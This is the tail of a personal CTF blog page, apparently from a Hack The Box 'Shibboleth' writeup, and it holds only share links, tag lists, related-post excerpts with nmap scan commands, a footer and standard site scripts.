class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Shibboleth Writeup - heapbytes&u=https://heapbytes.github.io/posts/Shibboleth/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hackthebox Shibboleth Writeup - heapbytes&url=https://heapbytes.github.io/posts/Shibboleth/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Shibboleth/">Hackthebox Shibboleth Writeup</a><li><a href="/posts/DAY1/">HTB Santa CTF DAY 1 </a><li><a href="/posts/Akahack/">Akahack easy Crypto</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/thm/">thm</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/doas/">doas</a> <a class="post-tag" href="/tags/dstat/">dstat</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/websockets/">websockets</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/DAY1/"><div class="card-body"> <em class="timeago small" date="2022-01-16 01:30:00 +0530" >Jan 16, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB Santa CTF DAY 1</h3><div class="text-muted small"><p> Toy Workshop [ Web ] Homepage The homepage had nothing intresting Source Code /web_toy_workshop/challenge/routes/index.js &amp;lt;--SNIPPED--&amp;gt; router.post(&#39;/api/submit&#39;, async (req...</p></div></div></a></div><div class="card"> <a href="/posts/horizonall_htb/"><div class="card-body"> <em class="timeago small" date="2022-02-06 00:00:00 +0530" >Feb 6, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox Horizontall Writeup</h3><div class="text-muted small"><p> Writeup Difficulty : Easy Port Scan 2 ports were open in this machine : 22, 80 └─$ nmap -p 22,80 -sC -sV horizontall.htb Startin...</p></div></div></a></div><div class="card"> <a href="/posts/Backdoor_htb/"><div class="card-body"> <em class="timeago small" date="2022-04-23 00:00:00 +0530" >Apr 23, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Backdoor Writeup</h3><div class="text-muted small"><p> Machine Name - Backdoor Initial Enumeration Nmap Scan 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 └─$ nmap -p- 1337,80,22 backdoor.htb -sC -sV Starting Nmap 7.91 ( https://nmap.org ) at...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Technovanza/" class="btn btn-outline-primary" prompt="Older"><p>Technovanza CTF 2022</p></a> <a href="/posts/Backdoor_htb/" class="btn btn-outline-primary" prompt="Newer"><p>Hackthebox Backdoor Writeup</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://github.com/heapbytes">heapbytes</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/thm/">thm</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/doas/">doas</a> <a class="post-tag" href="/tags/dstat/">dstat</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/websockets/">websockets</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
